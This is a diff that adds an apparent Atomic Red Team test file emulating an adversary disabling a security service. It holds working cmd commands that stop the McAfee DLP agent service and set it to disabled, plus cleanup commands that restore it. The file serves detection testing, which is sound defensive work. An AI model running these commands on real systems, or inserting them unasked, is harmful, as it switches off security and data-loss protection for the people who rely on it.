@@ -1,0 +1,14 @@
+#TechniqueName: Impair Defenses: Disable or Modify Tools
+#AtomicTestName: Disable Arbitrary Security Windows Service
+#Description: With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.&Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.&To verify that the service has stopped, run "sc query McAfeeDLPAgentService"&
+#Language: cmd
+
+#commands
+net.exe stop McAfeeDLPAgentService
+sc.exe config McAfeeDLPAgentService start= disabled
+
+
+#cleanup_commands
+sc.exe config McAfeeDLPAgentService start= auto >nul 2>&1
+net.exe start McAfeeDLPAgentService >nul 2>&1
+
